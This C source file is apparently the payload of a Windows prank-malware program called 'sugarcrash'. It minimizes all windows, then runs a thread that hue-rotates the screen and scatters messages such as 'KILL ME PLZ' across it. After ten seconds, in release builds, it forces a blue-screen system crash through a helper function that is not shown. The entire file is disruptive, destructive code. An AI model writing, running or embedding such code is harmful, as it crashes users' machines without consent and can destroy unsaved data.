#include "sugarcrash.h"

#define ROTATE_ANGLE        ((M_PI / 180.0f) * 15.0f)

static LPCTSTR g_alpTextArray[] = {
    TEXT("FEEL GOOD"),
    TEXT("OMG"),
    TEXT("KILL ME PLZ"),
};

static DWORD THREAD UpdateScreenThread(LPVOID lpParam)
{
    DWORD   dwUpdateMs = 1000 / Sugar_ScreenGetFrequency();
    FLOAT   fRotAngle = ROTATE_ANGLE;
    INT     iRandom;
    POINT   point;

    while (TRUE)
    {
        Sugar_ScreenPixelFilter(HueRotate, (LPVOID) &fRotAngle);
        Sugar_ScreenGetRandomPoint(&point);
        iRandom = Sugar_Random(0, ARRAYSIZE(g_alpTextArray) - 1);
        Sugar_ScreenDrawText(&point, g_alpTextArray[iRandom]);

    #if defined(DEBUG)
        Sugar_ScreenDrawText(&(POINT) {0}, TEXT("DEBUG"));
    #endif

        Sleep(dwUpdateMs);
    }
    
    return 0;
}

INT Sugar_Crash(VOID)
{
    Sugar_MinimizeAll();

    Sleep(1000);

    CreateThread(NULL, 0, &UpdateScreenThread, NULL, 0, NULL);

    Sleep(10000); // Wait for...

#if !defined(DEBUG)
    Sugar_BlueScreen(STATUS_ASSERTION_FAILURE);
#else
    ExitProcess(0);
#endif

    return 0;
}